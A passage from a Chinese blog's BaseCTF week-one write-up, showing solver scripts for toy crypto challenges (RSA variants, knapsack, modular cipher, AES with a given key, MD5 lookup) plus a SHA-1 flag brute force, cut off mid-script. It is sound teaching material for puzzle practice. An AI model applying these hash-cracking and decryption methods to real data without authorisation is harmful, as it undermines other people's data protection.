@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/AveMujica.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/AveMujica.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/AveMujica.png">
+  <link rel="mask-icon" href="/images/AveMujica.png" color="#222">
+  <meta name="google-site-verification" content="sotsy4lgOfq7UWSZABdX_wYNBGmHlfzSd6hSwcHXg0I">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"truthleader.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="misc部分基本都空着,如果也想要wp,请问https:&#x2F;&#x2F;maonie.top&#x2F;basectf官网:basectf.fun这是week1的wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="basectf_week1_wp">
+<meta property="og:url" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/index.html">
+<meta property="og:site_name" content="真理教教会">
+<meta property="og:description" content="misc部分基本都空着,如果也想要wp,请问https:&#x2F;&#x2F;maonie.top&#x2F;basectf官网:basectf.fun这是week1的wp">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_1_1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_1_2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_1_3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_4.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_5_1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_5_2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_5_3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_6_1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_6_2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_qiandao.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_echo.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_ret2text1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_ret2text2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_shellcode1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_shellcode2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_shellcode3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_wbtdl1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/pwn_wbtdl2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_ezida3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_ezida1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_ezida2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_upx1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_upx2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_upx3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_maze1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_maze2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/reverse_maze3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/re_ezxor1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/re_ezxor2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/re_ezxor3.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/re_ezxor4.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/re_base1.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/re_base2.png">
+<meta property="og:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/re_base3.png">
+<meta property="article:published_time" content="2024-08-18T04:01:06.000Z">
+<meta property="article:modified_time" content="2024-08-18T04:10:55.747Z">
+<meta property="article:author" content="truthleader">
+<meta property="article:tag" content="writeup - basectf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://truthleader.github.io/2024/08/18/basectf-week1-wp/web_1_1.png">
+
+<link rel="canonical" href="https://truthleader.github.io/2024/08/18/basectf-week1-wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>basectf_week1_wp | 真理教教会</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="真理教教会" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">真理教教会</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">学习是美德，知识是财富，求道是目的</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-rss">
+
+    <a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/truthleader" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://truthleader.github.io/2024/08/18/basectf-week1-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/AveMujica.png">
+      <meta itemprop="name" content="truthleader">
+      <meta itemprop="description" content="学习是美德，知识是财富，求道是目的">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="真理教教会">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          basectf_week1_wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-08-18 12:01:06 / Modified: 12:10:55" itemprop="dateCreated datePublished" datetime="2024-08-18T12:01:06+08:00">2024-08-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>8 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>misc部分基本都空着,如果也想要wp,请问<a target="_blank" rel="noopener" href="https://maonie.top/">https://maonie.top/</a><br>basectf官网:basectf.fun<br>这是week1的wp</p>
+<span id="more"></span>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h2><h2 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h2><h2 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h2><h2 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a><strong>[Week1] 正着看还是反着看呢？</strong></h2><h2 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h2><h2 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h2><p>总之就是一个条件一个条件的掰flag<br>最后better个be部分没提示了,但是有hash爆破<br>BaseCTF{s1Mpl3_1s_??Tt3r_Th4n_C0mPl3x}<br>我不记得是猜Be还是用下面的exp爆的,这题做的我昏过去了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">import itertools  </span><br><span class="line">  </span><br><span class="line"># 给定的flag模板和哈希值  </span><br><span class="line">flag_template = &#x27;BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;&#x27;  </span><br><span class="line">target_hash = &#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;  </span><br><span class="line">  </span><br><span class="line"># 可能的字符集（这里假设是小写字母和数字）  </span><br><span class="line">charset = &#x27;QAZWSXEDCRFVTGBYHNUJMIKLOPabcdefghijklmnopqrstuvwxyz0123456789&#x27;  </span><br><span class="line">  </span><br><span class="line"># 遍历所有可能的两个字符组合  </span><br><span class="line">for chars in itertools.product(charset, charset):  </span><br><span class="line">    # 生成当前尝试的flag  </span><br><span class="line">    current_flag = flag_template.replace(&#x27;??&#x27;, &#x27;&#x27;.join(chars))  </span><br><span class="line">    # 计算当前flag的SHA-1哈希值  </span><br><span class="line">    current_hash = hashlib.sha1(current_flag.encode()).hexdigest()  </span><br><span class="line">    # 检查哈希值是否匹配  </span><br><span class="line">    print(current_hash)</span><br><span class="line">    if current_hash == target_hash:  </span><br><span class="line">        print(f&quot;找到匹配的flag: &#123;current_flag&#125;&quot;)  </span><br><span class="line">        break  # 找到匹配项后退出循环  </span><br><span class="line">else:  </span><br><span class="line">    print(&quot;没有找到匹配的flag&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h2><h2 id="Week1-倒计时？海报！（包括公开版和公开前）"><a href="#Week1-倒计时？海报！（包括公开版和公开前）" class="headerlink" title="[Week1] 倒计时？海报！（包括公开版和公开前）"></a>[Week1] 倒计时？海报！（包括公开版和公开前）</h2><h2 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a><strong>[Week1] 签到！DK 盾！</strong></h2><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-ez-rsa"><a href="#Week1-ez-rsa" class="headerlink" title="[Week1] ez_rsa"></a>[Week1] ez_rsa</h2><p>题目给了n e c 还有not_phi&#x3D;(p+2)<em>(q+2)&#x3D;p<code>*</code>q+2p+2q+4<br>要算出私钥d就要算出n的欧拉函数<br>n的欧拉函数是(p-1)</em>(q-1)&#x3D;p<code>*</code>q-p-q+1</p>
+<p>n &#x3D; p<code>*</code>q<br>所以这是初中生就能解决的因式问题</p>
+<p>n的欧拉函数 &#x3D; (not_phi-n-4)&#x2F;&#x2F;2</p>
+<p>得到欧拉函数就可以用模逆元算d</p>
+<p>有c d n就有明文</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from sympy import mod_inverse  </span><br><span class="line"></span><br><span class="line">e=65537</span><br><span class="line">c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br><span class="line">not_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br><span class="line">n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br><span class="line"></span><br><span class="line">pplusq=(not_phi-n-4)//2</span><br><span class="line">phi=n+1-pplusq</span><br><span class="line">d = mod_inverse(e, phi)</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Week1-babypack"><a href="#Week1-babypack" class="headerlink" title="[Week1] babypack"></a>[Week1] babypack</h2><p>加密脚本的过程大概是</p>
+<ol>
+<li>把flag转换为2进制</li>
+<li>创建一个随机数列表a,可以观察到每个随机数必然是后一个的两倍多一点</li>
+<li>然后看flag的2进制中的每一位是不是1,如果是则将随机数列表里对应数加到变量c上</li>
+</ol>
+<p>我们有的是a和c<br>那么就可以让a[i]和c比大小,判断第i+1位是不是1</p>
+<p>总之exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># a = ···</span><br><span class="line"># c = ···</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">    if c&gt;i:</span><br><span class="line">        c-=i</span><br><span class="line">        print(1,end=&#x27;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(0,end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">flag=0b10000100110000101110011011001010100001101010100010001100111101100110010011000110011010001100010001100000110001100110001001101010010110100110011011000100110010101100101001011010011010001100101001101000110000100101101011000100110010100110110011001010010110100110000011001100011001000110001011001010011010000110100011000100110010000110100011000110011100101111100</span><br><span class="line">print(libnum.n2s(flag))</span><br></pre></td></tr></table></figure>
+
+<h2 id="Week1-babyrsa"><a href="#Week1-babyrsa" class="headerlink" title="[Week1] babyrsa"></a>[Week1] babyrsa</h2><p>rsa算法,但是没有p和q,直接取n<br>我猜n大概率是素数,所以直接算它的欧拉函数</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import libnum</span><br><span class="line">from sympy import mod_inverse  </span><br><span class="line"></span><br><span class="line">n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br><span class="line">e = 65537</span><br><span class="line">c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><span class="line">phi = n-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = mod_inverse(e, phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Week1-十七倍"><a href="#Week1-十七倍" class="headerlink" title="[Week1] 十七倍"></a><strong>[Week1] 十七倍</strong></h2><p>明文m转秘文c的算式为<br>m*17%256&#x3D;c</p>
+<p>那么 m&#x3D;c*17关于256的模逆元%256<br>可以很容易的知道是241</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line">         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,</span><br><span class="line">        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,</span><br><span class="line">         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,</span><br><span class="line">        180, 113, 146, 148, 163,  79,  78,  48, 231,  77</span><br><span class="line">] </span><br><span class="line"></span><br><span class="line">for int in cipher:</span><br><span class="line">    print(chr(int),end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">print()</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">    cipher[i] = (cipher[i]*241) % 256</span><br><span class="line"></span><br><span class="line">for int in cipher:</span><br><span class="line">    print(chr(int),end=&#x27;&#x27;)</span><br><span class="line">  </span><br><span class="line"># 或者，如果你不想使用预定义的逆元  </span><br><span class="line"># x = solve_modular_equation(y, multiplier=17, modulus=256)  </span><br><span class="line"># print(f&quot;x = &#123;x&#125;&quot;)  # 同样应该输出 x = 148</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-helloCrypto"><a href="#Week1-helloCrypto" class="headerlink" title="[Week1] helloCrypto"></a><strong>[Week1] helloCrypto</strong></h2><p>很简单的一道<br>aes是对称加密,即然key给了就能直接解</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line">import random</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">key = libnum.n2s(208797759953288399620324890930572736628)</span><br><span class="line">my_aes=AES.new(key=key,mode=AES.MODE_ECB)</span><br><span class="line">c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><span class="line"></span><br><span class="line">decrypted_padded = my_aes.decrypt(c)  </span><br><span class="line"></span><br><span class="line">print(decrypted_padded)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Week1-你会算md5吗"><a href="#Week1-你会算md5吗" class="headerlink" title="[Week1] 你会算md5吗"></a><strong>[Week1] 你会算md5吗</strong></h2><p>题目的加密过程,是将flag里的每一个字符都单独拎出来算一遍md5<br>那么只要把ascii表上的字符都算一遍做成字典,然后和密文撞就行了</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">import string  </span><br><span class="line">  </span><br><span class="line">def build_md5_dict():  </span><br><span class="line">    md5_dict = &#123;&#125;  </span><br><span class="line">    characters = string.ascii_letters + string.digits + string.punctuation  </span><br><span class="line">    for char in characters:  </span><br><span class="line">        md5_hash = hashlib.md5(char.encode()).hexdigest()  </span><br><span class="line">        md5_dict[md5_hash] = char  </span><br><span class="line">    return md5_dict  </span><br><span class="line">  </span><br><span class="line"># 构建并打印MD5字典（注意：这里只打印了一部分以节省空间）  </span><br><span class="line">md5_dict = build_md5_dict()  </span><br><span class="line">  </span><br><span class="line"># 注意：由于MD5的哈希冲突可能性极低（但不为0），我们假设在这个小字符集中没有冲突。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recover_string_from_md5_list(md5_list, md5_dict):  </span><br><span class="line">    recovered_string = &quot;&quot;  </span><br><span class="line">    for md5_hash in md5_list:  </span><br><span class="line">        if md5_hash in md5_dict:  </span><br><span class="line">            recovered_string += md5_dict[md5_hash]  </span><br><span class="line">        else:  </span><br><span class="line">            # 如果MD5列表中包含未知的MD5值，可以选择跳过或抛出异常  </span><br><span class="line">            recovered_string += &quot;?&quot;  </span><br><span class="line">    return recovered_string  </span><br><span class="line">  </span><br><span class="line"># 示例MD5列表  </span><br><span class="line">md5_list = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, 